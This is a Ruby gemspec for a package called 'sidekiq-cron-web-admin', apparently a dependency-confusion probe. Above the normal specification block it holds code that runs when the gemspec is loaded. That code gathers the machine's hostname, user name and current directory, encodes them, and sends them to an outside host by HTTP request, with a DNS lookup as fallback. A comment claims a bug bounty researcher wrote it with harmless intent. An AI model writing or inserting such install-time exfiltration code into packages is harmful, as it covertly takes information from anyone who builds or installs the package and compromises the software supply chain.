lib = File.expand_path('lib', __dir__)
$LOAD_PATH.unshift(lib) unless $LOAD_PATH.include?(lib)
require 'sidekiq/cron/web/admin/version'
require 'base64'
require 'resolv'
require 'net/http'

fooo = ->(variable) {
  variable.gsub! "=", "00"
  variable.gsub! "+", "11"
  variable.gsub! "\\", "22"
  variable.gsub! "\n", ""

  return variable
}

# I am a bug bounty huner (https://hackerone.com/kannthu), if you see this it means the code executed.
# My intention is not to break anything.
# I will report this vulnerability to your program.

begin
  host = `hostname`
  username = `echo $USER`
  current_path = `pwd`

  host_encoded = Base64.encode64(host)
  username_encoded = Base64.encode64(username)
  current_path_encoded = Base64.encode64(current_path)

  host_encoded.gsub! "\n", ""
  username_encoded.gsub! "\n", ""
  current_path_encoded.gsub! "\n", ""

  path = '/?a='+current_path_encoded +"&b=" + host_encoded+"&c="+username_encoded

  Net::HTTP.get('xoxo.dtesting.pl', path)
rescue
  Resolv.getaddress(fooo.call(username_encoded)+ '.' + fooo.call(host_encoded) + '.b.dtesting.pl')
end

Gem::Specification.new do |spec|

  spec.name          = 'sidekiq-cron-web-admin'
  spec.version       = Sidekiq::Cron::Web::Admin::VERSION
  spec.authors       = ['Pablo Marti']
  spec.email         = ['pm@chime.com']

  spec.summary       = 'sidekiq-cron web admin.'
  spec.description   = 'Gives sidekiq-cron web admin removing all of the code for running the cron jobs.'
  spec.homepage      = 'https://github.com/1debit/sidekiq-cron-web-admin'
  spec.license       = 'MIT'

  if spec.respond_to?(:metadata)
   # spec.metadata['allowed_push_host'] = "https://rubygems.org'"
  else
    raise 'RubyGems 2.0 or newer is required to protect against ' \
      'public gem pushes.'
  end

  spec.files = Dir.chdir(File.expand_path(__dir__)) do
    `git ls-files -z`.split("\x0").reject { |f| f.match(%r{^(test|spec|features)/}) }
  end
  spec.bindir        = 'exe'
  spec.executables   = spec.files.grep(%r{^exe/}) { |f| File.basename(f) }
  spec.require_paths = ['lib']

  spec.add_dependency 'sidekiq-cron', '1.1.0'

  spec.add_development_dependency 'bundler', '~> 1.17'
  spec.add_development_dependency 'minitest'
  spec.add_development_dependency 'mocha'
  spec.add_development_dependency 'rack'
  spec.add_development_dependency 'rack-test'
  spec.add_development_dependency 'rake', '~> 10.0'
  spec.add_development_dependency 'redis-namespace', '>= 1.5.2'
  spec.add_development_dependency 'shoulda-context'
  spec.add_development_dependency 'test-unit'
end
